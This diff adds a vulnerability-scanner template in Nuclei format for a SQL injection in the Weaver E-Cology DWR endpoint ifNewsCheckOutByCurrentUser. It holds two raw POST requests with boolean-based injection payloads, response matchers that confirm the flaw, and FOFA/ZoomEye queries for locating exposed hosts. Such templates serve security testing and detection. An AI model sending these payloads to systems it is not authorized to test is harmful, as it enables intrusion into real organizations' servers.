@@ -1,0 +1,63 @@
+id: ecology-ifnewscheckoutbycurrentuser-dwr-sqli
+
+info:
+  name: 泛微 E-Cology ifnewscheckoutbycurrentuser.dwr SQL 注入
+  author: SleepingBag945
+  severity: high
+  description: |-
+    FOFA: app="泛微-EOffice"
+    ZoomEye: app:"泛微移动办公平台e-mobile"
+  tags: ecology,sqli,e-mobile,e-office,e-cology
+
+
+http:
+  - raw:
+      - |
+        POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        Accept-Encoding: gzip
+
+        callCount=1
+        page=
+        httpSessionId=
+        scriptSessionId=
+        c0-scriptName=DocDwrUtil
+        c0-methodName=ifNewsCheckOutByCurrentUser
+        c0-id=0
+        c0-param0=string:1 AND 1=1
+        c0-param1=string:1
+        batchId=0
+
+      - |
+        POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        Accept-Encoding: gzip
+
+        callCount=1
+        page=
+        httpSessionId=
+        scriptSessionId=
+        c0-scriptName=DocDwrUtil
+        c0-methodName=ifNewsCheckOutByCurrentUser
+        c0-id=0
+        c0-param0=string:1 AND 1=2
+        c0-param1=string:1
+        batchId=0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - "dwr.engine._remoteHandleCallback('0','0',true)"
+
+      - type: word
+        part: body_2
+        words:
+          - "dwr.engine._remoteHandleCallback('0','0',false)"
+
+      - type: status
+        status:
+          - 200
